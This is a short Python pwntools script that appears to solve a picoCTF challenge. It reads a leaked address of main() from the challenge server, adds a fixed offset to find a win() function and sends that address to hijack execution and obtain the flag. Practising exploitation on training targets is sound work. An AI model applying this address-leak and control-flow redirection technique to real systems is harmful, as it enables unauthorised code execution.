from pwn import *

# Connect to the server
context.log_level = "debug"
p = remote("rescued-float.picoctf.net", 58015)

# Receive the leaked address of main()
p.recvuntil(b"Address of main: ")
main_leak = p.recvline().strip()
main_addr = int(main_leak, 16)

# Calculate the address of win()
win_offset = -0x96  # Updated offset
win_addr = main_addr + win_offset

# Send the address of win() as input
p.sendlineafter(b"Enter the address to jump to, ex => 0x12345: ", hex(win_addr).encode())

# Receive the flag
p.interactive()
